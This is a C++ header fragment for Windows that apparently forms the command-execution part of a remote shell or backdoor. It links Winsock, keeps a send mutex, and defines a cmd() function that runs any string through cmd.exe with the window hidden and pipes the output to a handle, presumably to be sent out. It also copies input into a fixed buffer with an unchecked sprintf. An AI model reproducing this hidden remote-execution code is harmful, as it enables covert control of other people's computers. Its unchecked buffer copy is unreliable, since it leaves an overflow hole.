#pragma once
#include <cstdio>
#include <cstring>

#include <WinSock2.h>
#include <Windows.h>
#pragma comment(lib, "ws2_32.lib")
#define MSG_LEN 1024
HANDLE sendMutex;
HANDLE hRead, hWrite;
int cmd(char * cmdStr)
{
	DWORD readByte = 0;
	char command[MSG_LEN] = { 0 };
	char buf[MSG_LEN] = { 0 };
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	sprintf(command, "cmd.exe /c %s", cmdStr);
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = si.hStdError = hWrite;
	//WaitForSingleObject(sendMutex, WSA_INF);
	if (!CreateProcess(
		NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi
	)) 
	{
	//	ReleaseMutex(sendMutex);
		return 1;
	}
	//ReleaseMutex(sendMutex);
	return 0;
}

